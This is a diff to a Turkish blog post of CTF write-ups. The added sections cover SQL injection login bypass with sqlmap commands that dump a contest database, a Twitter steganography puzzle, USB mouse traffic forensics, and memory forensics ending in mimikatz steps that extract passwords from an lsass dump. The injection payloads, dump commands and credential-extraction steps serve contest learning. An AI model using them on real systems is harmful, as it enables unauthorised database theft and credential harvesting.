@@ -247,7 +247,85 @@
 <p>Kullanıcı adı: Yonetici<br />
 Şifre: 1’or’1’=’1</p>
 
-<p>Olarak sisteme giriş yaptık</p>
+<p>Olarak sisteme giriş yaptık cevabı deli gibi sitede aradık hatta giriş yaptın bölümündeki değerleri deneyen arkadaşlarımız bile oldu bu soruyu uzun süre yapamadık siteye yapılan ddos saldırıları ve kesintiler aslında bu konuda başımızı baya ağrıttı kimi zaman soruların alanlarınada ulaşamadık herneyse</p>
+
+<p>Burp suiteyi browser ile beraber çalışacak hale getirin( burp suite -&gt; Proxy -&gt; Options(burada 127.0.0.1:8080 var ve tikli ise)
+browser(iceweasel) -&gt; preferences -&gt; advanced options -&gt; Connection -&gt; Manual Proxy Connection HTTP Proxy 127.0.0.1 Port 8080 yapın kaydedin.</p>
+
+<p>Burpta intercept off olarak ayarlayın.
+Iceweaselda http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/ açın.</p>
+
+<p>sayfa yüklendikten sonra burpta <code class="highlighter-rouge">intercept ON</code> yapın.</p>
+
+<p>Kullanıcı adı: Yonetici<br />
+Şifre: ‘or ‘1’=’1</p>
+
+<p>olarak yollayın.</p>
+
+<p>Burp RAW sekmesinde bir post data yakalamış olacaktır.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>
+POST /fc00914149de9f33c30cf0164ec4db95/ HTTP/1.1
+Host: 85.111.95.37
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.3.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/
+Cookie: PHPSESSID=h2041ov1n3ukbfqjmlc0pu7657
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 48
+
+kullaniciadi=Yonetici&amp;parola=%27or%271%27%3D%271
+</code></pre>
+</div>
+
+<p>ve bu datayı kopyalayın sql2.txt olarak Root Home içersine kayıt edin. yeni terminal açın sqlmap -r sql2.txt -p parola //yazın password kısımının sql injectiona açık olduğunu bulacaktır. çıkan sorulara yes deyin database in <code class="highlighter-rouge">mySQL</code> olduğunu bulacaktır. Olaylar buradan sonra başlayacak</p>
+
+<p>database adını bulacaksınız. 2 adet database buluyor teki information_sc bunu geçin klasik hepsinde olan diğerdir diğeri ise bizim aradığımız</p>
+
+<p>adı: web2</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>sqlmap -u "http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95" --data="kullaniciadi=Yonetici&amp;parola='or '1'='1" --dbs
+</code></pre>
+</div>
+
+<p>tabloları çekmek için</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>sqlmap -u "http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95" --data="kullaniciadi=Yonetici&amp;parola='or '1'='1" --tables -D web2
+</code></pre>
+</div>
+
+<p>kullanicilar diye tek bir tablo bulucak.</p>
+
+<p>Kolonları çekmek için</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>sqlmap -u "http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95" --data="kullaniciadi=Yonetici&amp;parola='or '1'='1" --columns-D web2 -T kullanicilar
+</code></pre>
+</div>
+
+<p>Bunun sonucunda aşağıdaki gibi bir sonuç çıkacak</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>id int(255)
+kullaniciadi varchar(255)
+parola int(255)
+</code></pre>
+</div>
+
+<p>kolonlardaki verileri çekmek için</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>sqlmap -u "http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95" --data="kullaniciadi=Yonetici&amp;parola='or '1'='1" --dump -D web2 -T kullanicilar
+</code></pre>
+</div>
+
+<p>2 adet Kullanıcı bulucak teki <code class="highlighter-rouge">Yonetici</code> diğerinin adı “FLAG:” <strong>FLAG</strong> kullanıcısının parolası</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>f4aa0edc033b9dfcc676c33420996789
+</code></pre>
+</div>
+
+<p>Kaynak: Alpcan ONARAN</p>
 
 <hr />
 
@@ -483,7 +561,24 @@ a-b OR a/b  &gt; Char
 </code></pre>
 </div>
 
-<p>Ancak bu değer sistem tarafından kabul edilmiyor. Dosya içerisinde başka bir şekilde bulunuyor olma ihtimali yüksek</p>
+<p>Ancak haliyle cevap bu değil daha sonra biz düşündük ki Hackerın oğlu adlı CTF de bulduğumuz bir değer vardı google ve github araması yaparak bayrağa ulaşmıştık bu tarz bir soru olabileceğini düşündük ve direk olarak google aramalarına başladık</p>
+
+<p>İlk olarak</p>
+
+<ul>
+  <li>github</li>
+  <li>gitlab</li>
+  <li>bitbucket</li>
+  <li>facebook</li>
+  <li>twitter</li>
+</ul>
+
+<p>Derken twitterda bir adet hesap çıktı karşımıza ve <code class="highlighter-rouge">siber starımı arıyorsun ?</code> yazıyordu altındada ilginç ve bol <code class="highlighter-rouge">aa</code> içeren bir mesaj, şu şekilde</p>
+
+<blockquote class="twitter-tweet" data-lang="tr"><p lang="und" dir="ltr">aaaａａaaａaaａaaaaａaａaaaａaａaaａａａaaaａａａａaaaａaaaaaａaａaaaaaaaaaaａａaａａaaａaaaaａaaａａａaａaａaaａaaａaaａａaａaａaaaａａａａaaａaaａaaａaaａａaaaaaaaaaaaaaaaaaaaaaaaaa</p>&mdash; Siber Star (@siber_star) <a href="https://twitter.com/siber_star/status/794469360723230720">4 Kasım 2016</a></blockquote>
+<script async="" src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<p>Daha sonra google araması yapmaya devam ettik bu neyin şifrelemesiydi yada neyi işaret ediyordu diye soru steg sorusu olduğu için googlede <code class="highlighter-rouge">Twitter Steganography</code> olarak arama yaptık karşımıza java ile yazılmış bir adet tool ve online bu işlemin yapılabileceği bir web sitesi çıktı direk olarak kopyala yapıştır yaptıktan sonra IRC kanalını işaret ediyordu haliyle bayrağı buradan elde ettik.</p>
 
 <hr />
 
@@ -548,7 +643,28 @@ for i in liste.split(","):
 </code></pre>
 </div>
 
-<p>devamı gelecek…</p>
+<p>İşlemi yaptık bu işlemden sonra bize bir takım MAC adreslerine benzeyen ama cihaz hakkında bilgi sağladığını biliyorduk hemen googlede ufak bir arama yaptık ve bu konuda google CTF de bir makele bulduk aramak o kadarda uzun sürmedi daha sonra bunun usb bellek olmadığını bir fare olduğunu anladık bu bizim içinde bir ilk oldu forensic konusunda eksik olduğumuzuda haliyle anlamış olduk :)</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>awk -F: 'function comp(v){if(v&gt;127)v-=256;return v}{x+=comp(strtonum("0x"$2));y+=comp(strtonum("0x"$3))}$1=="01"{print x,y}' dump.txt &gt; sirali.txt
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>-1084 -79
+-1084 -79
+-1083 -80
+-1083 -86
+-1083 -89
+-1083 -97
+</code></pre>
+</div>
+
+<p>ve devam eden satırlar gördük sonra makaledede belirttiği gibi <code class="highlighter-rouge">gnuplot</code> kullanarak bir çizim elde ettik bu çizimde ise <code class="highlighter-rouge">fareyi_buldum</code> yazıyordu. Bu değeri MD5 olarak çevirdiğimizde ise cevabı elde etmiş olduk</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>a9930510d6923f409fcdba49f8280a3f
+</code></pre>
+</div>
+
+<p>Kullandığımız makale ise <a href="https://www.rootusers.com/google-ctf-2016-forensic-for2-write-up/">Google CTF 2016 Forensic</a></p>
 
 <hr />
 
@@ -619,12 +735,6 @@ try.html
 
 <p><strong>Soru 11</strong></p>
 
-<p><em>Holowy Conz den beklediğimiz mesaj geldi, acaba nedir ?</em></p>
-
-<hr />
-
-<p><strong>Soru 12</strong></p>
-
 <p><em>Yapabileceğine inancımız tam.</em> Bu sorudada öncelikli olarak linki baya bi kurcaladık ne var ne yok diye bakma isteği duyduk sonra get isteği atmaya sql map ile denemeye başladık ilk olarak yüksek hızlı tarama işlemi yapınca site requestleri drop etmeye başladı bizde dedik bu böyle olmaz bir takım kısıtlamalar ile taramaya devam ettik şu şekilde bir URL elde ettik</p>
 
 <div class="highlighter-rouge"><pre class="highlight"><code>index.php?id=1' UNION ALL SELECT NULL,CONCAT(0x716b626b71,0x756a64567375626642615a5042756b5551576d4345784d6e527a526545734a6c585a4a4745766175,0x71786b6271)-- mmYT--
@@ -633,13 +743,110 @@ try.html
 
 <hr />
 
-<p><strong>Soru 13</strong></p>
+<p><strong>Soru 12</strong></p>
 
 <p><em>Zararlı bir hacker’ın bilgisayarından veri elde ettik, içerisindeki hackerin şifresini bulabilir misin ?</em></p>
 
+<p>Bu soruda bizlere bir dosya verilmişti.</p>
+
+<ul>
+  <li><strong>Dosya ismi :</strong> usom-forensics</li>
+</ul>
+
+<p>Bu gibi sorularda ilk olarak yapmamız gereken şey dosya hakkında bilgi almak için “<strong>file</strong>” komutunu kullanmaktır. Bizde bu soruda bu komu ile dosyayı incelediğimizde aşağıdaki gibi bir sonuç ile karşılaştık.</p>
+
+<ul>
+  <li><strong>Komut:</strong> file usom-forensics</li>
+</ul>
+
+<p><img src="/assets/file.png" /></p>
+
+<p>Bu bilgiden sonra “mv” komutu ile dosyanın uzantısını değiştiriyoruz.</p>
+
+<ul>
+  <li><strong>Komut:</strong> mv usom-forensics usom-forensics.7z</li>
+</ul>
+
+<p>Daha sonra “7za” aracı ile dosya içerisindeki veriyi çıkartıyoruz.</p>
+
+<ul>
+  <li><strong>Komut:</strong> 7za e usom-forensics.7z</li>
+</ul>
+
+<p><img src="/assets/7ze.png" /></p>
+
+<p>İçerisindeki veri tekrar file komutu ile incelendiğinde bir data olduğu bilgisini alıyoruz. Bu işlemden sonra volatility aracı ile incelemeye alıyoruz.</p>
+
+<p>Bunun için ilk olarak image hakkında bilgi almak için aşağıdaki komutu kullanıyoruz.</p>
+
+<ul>
+  <li><strong>Komut:</strong> volatility -f usom-forensics imageinfo</li>
+  <li>“-f”: incelenecek dosya tanımlanır.</li>
+</ul>
+
+<p>RAM imajı analizi sorularında genelde ilk yapılması gereken şey, “<strong>pslist</strong>” komutu ile çalışan işlemleri listelemek ve sistemde o anda ki işleyiş hakkında bilgi sahibi olmaktır.</p>
+
+<ul>
+  <li><strong>Komut:</strong> volatility -f usom-forensics –profile=Win7SP0x86 pslist</li>
+</ul>
+
+<p><img src="/assets/pslist.png" /></p>
+
+<p>Bu çıktı sonucunda dikkat çeken işlemler:</p>
+
+<ul>
+  <li>mspaint.exe</li>
+  <li>notepad.exe</li>
+  <li>lsass.exe</li>
+</ul>
+
+<p>mspaint.exe dumpı alınıp gimp ile incelenip üzerine çalışılan resim üzerinden bilgi elde edilebilir. CTF lerde bu tarz sorular görüyoruz. Ancak böyle bir inceleme sonucunda aşağıdaki gibi bir sonuç ile karşılaştık.</p>
+
+<p><img src="/assets/flagdegil.jpg" /></p>
+
+<p>Zaten bize sorulan şey bir parolaydı.</p>
+
+<ul>
+  <li>Soru: Zararlı bir hacker’ın bilgisayarından veri elde ettik, içerisindeki hackerin şifresini bulabilir misin ?</li>
+</ul>
+
+<p>Bu nedenle volatility içerisinde kullanılabilen hashdump parametresi de denenebilirdi. Ancak burda da tatmin edici bir sonuç yoktu.</p>
+
+<p>“pslist” dışında en çok işinize yarayacak bir diğer parametre “<strong>filescan</strong>” parametresidir.</p>
+
+<p>Dosya üzerinde “<strong>filescan</strong>” çalıştırıldığında flag adı ile bazı dosyalar olduğu gözlemlenmiştir.</p>
+
+<ul>
+  <li><strong>Komut:</strong> volatility -f usom-forensics –profile=Win7SP0x86 filescan</li>
+</ul>
+
+<p><img src="/assets/filescan.png" /></p>
+
+<p>Bu veriler “<strong>dumpfiles</strong>” parametresi ile elde edilebiliyordu.</p>
+
+<p><img src="/assets/dumpfiles.png" /></p>
+
+<p>Elde edilen bu verilerden <strong>flag.txt</strong> incelendiğinde lsass dump dosyasına ait bir link elde ediliyordu.</p>
+
+<p><img src="/assets/flag.png" /></p>
+
+<p>Bu dump mimikatz ile incelendiğinde parola elde edilebiliyordu.</p>
+
+<p><strong>Adımlar:</strong></p>
+
+<ul>
+  <li>privilege::debug</li>
+  <li>sekurlsa::minidump lsass</li>
+  <li>sekurlsa::logonPasswords</li>
+</ul>
+
+<p><img src="/assets/pass.png" /></p>
+
+<p>Asıl Kaynak: <a href="https://github.com/besimaltnok/siberyildiz/blob/master/usom_forensics/forensics.md">Besim ALTINOK</a></p>
+
 <hr />
 
-<p><strong>Soru 14</strong></p>
+<p><strong>Soru 13</strong></p>
 
 <p><em>Nedir bu sence ?</em> Sorusunun ne olduğunu her ne kadar anlasak da cevaba ulaşamadık altın oran sorusu olup fibonacci ile rabbit seq arasında bir ilişki bulunmakta</p>
 
@@ -647,6 +854,8 @@ try.html
 
 <p>Yasin YAMAN<br />
 Ömer İPEK<br />
+Yusuf GENÇ<br />
+Onur KOLAY<br />
 Furkan KALKAN ve diğer tüm arkadaşlarıma teşekkürlerimi sunarım.</p>
 
 </div>
